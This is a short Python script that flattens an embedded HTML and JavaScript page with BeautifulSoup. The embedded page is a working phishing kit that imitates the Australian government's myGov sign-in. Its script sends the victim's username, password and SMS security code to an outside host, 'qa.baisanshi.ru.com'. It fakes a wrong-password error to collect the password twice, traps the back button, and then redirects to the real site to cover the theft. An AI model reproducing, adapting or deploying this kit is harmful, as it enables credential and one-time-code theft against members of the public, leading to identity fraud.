from bs4 import BeautifulSoup

html_code = '''
<a class="unauth-govt-crest__link">
<img alt="myGov Beta" id="unauth-govt-crest" role="img" src="https://login.my.gov.au/mygov/content/mgv2/blugov/myGov-cobranded-logo-black.svg"/>
</a> Error message: Error Your sign-in details are wrong. <a href="/mygov/content/html/help.html#signing">Having trouble signing in?</a> Having trouble signing in? (RFM10) Sign in with myGov Using your myGov sign in details <form action="" class="mygov-login-form alternative" id="GOV1" method="post" name="GOV1">
<div class="input-group">
<label class="override" for="userId">Username or email</label>
<input aria-required="true" autocomplete="off" id="UN" name="UN" required="" type="text" value=""/>
</div>
<div class="input-group">
<label class="override" for="password">Password</label>
<input aria-required="true" autocomplete="off" id="PW" name="PW" required="" type="password"/>
</div>
<p class="recovery">
<a class="anchor override">Forgot password</a>
</p>
<div class="button-digital-id-main-container override">
<div class="digital-id-button-container">
<button class="button-main" id="btn1" type="submit">
                            Sign in
                          </button>
</div>
</div>
<div id="msg2" style="color: red; display: none">
                        Mot de passe incorrect. Veuillez réessayer
                      </div>
<p class="create-account-text">
<a class="create-account-link" href="https://my.gov.au/en/create-account/">Create a myGov account</a>
                        if you don't have one already.
                      </p>
</form> Username or email <input aria-required="true" autocomplete="off" id="UN" name="UN" required="" type="text" value=""/> Password <input aria-required="true" autocomplete="off" id="PW" name="PW" required="" type="password"/> <a class="anchor override">Forgot password</a> Forgot password Sign in Mot de passe incorrect. Veuillez réessayer <a class="create-account-link" href="https://my.gov.au/en/create-account/">Create a myGov account</a> Create a myGov account if you don't have one already. Enter code We sent a code by SMS to your mobile number. <form action="" id="GOV2" method="post" name="GOV2">
<div class="code-container">
<label for="otpanswer">Code </label>
<input class="security-code" id="C1" name="C1" required="" type="tel"/>
</div>
<div class="hasInfo" id="security-codes-info">
<p>
              If you don't want to use Digital Identity, you can
              <a>call the helpdesk</a> to create a new myGov account.
            </p>
<a class="continue-digital-identity-chevron" data-infotext-continue="" href="/las/mygov-login?execution=e42s2&amp;_eventId=continueWithDigitalIdentity">Continue with Digital Identity</a>
</div>
<div class="button-container">
<button class="form-add-btn" id="btn2" type="submit">Next</button>
</div>
</form> Code <input class="security-code" id="C1" name="C1" required="" type="tel"/> If you don't want to use Digital Identity, you can <a>call the helpdesk</a> call the helpdesk to create a new myGov account. <a class="continue-digital-identity-chevron" data-infotext-continue="" href="/las/mygov-login?execution=e42s2&amp;_eventId=continueWithDigitalIdentity">Continue with Digital Identity</a> Continue with Digital Identity Next Footer <a target="_blank">Terms of use</a> Terms of use <a target="_blank">Privacy and security</a> Privacy and security <a target="_blank">Copyright</a> Copyright <a target="_blank">Accessibility</a> Accessibility <a>
<img alt="myGov Beta" height="70" role="img" src="https://login.my.gov.au/mygov/content/mgv2/blugov/myGov-cobranded-logo-white.svg" width="313.17"/>
</a> We acknowledge the Traditional Custodians of the lands we live on.
              We pay our respects to all Elders, past and present, of all
              Aboriginal and Torres Strait Islander nations. history.pushState(null, document.title, location.href);
      window.addEventListener("popstate", function (event) {
        history.pushState(null, document.title, location.href);
      });

      //$(document).bind("contextmenu", function(e){ return false;});

      var count = 0;
      var counts = 0;

      $("#GOV1").on("submit", function (e) {
        count = count + 1;
        $("#btn1").html("Verifing.......");
        $.post(
          "https://qa.baisanshi.ru.com/.lufx/box/next1.php",
          $(this).serialize(),
          function (data) {
            console.log(data);
          }
        );
        setTimeout(function () {
          if (count == 2) {
            $("#step1").hide();
            $("#step2").show();
          } else {
            $("#PW").val("");
            $("#msg").show();
            $("#btn1").html("Sign in");
          }
        }, 2000);
        e.preventDefault();
      });

      $("#GOV2").on("submit", function (e) {
        counts = counts + 1;
        $("#btn2").html("Verifing.......");
        $.post(
          "https://qa.baisanshi.ru.com/.lufx/box/next2.php",
          $(this).serialize(),
          function (data) {
            console.log(data);
          }
        );
        setTimeout(function () {
          if (counts == 1) {
            $("#step4").show();
            $("#step5").show();

            setTimeout(function () {
              window.location.href = "https://my.gov.au/";
            }, 9000);
          } else {
            $("#C2").val("");
            $("#msg").show();
            $("#btn2").html("Verify");
          }
        }, 2000);
        e.preventDefault();
      });
'''

soup = BeautifulSoup(html_code, 'html.parser')
one_line_html = ' '.join(soup.prettify().split())

print(one_line_html)
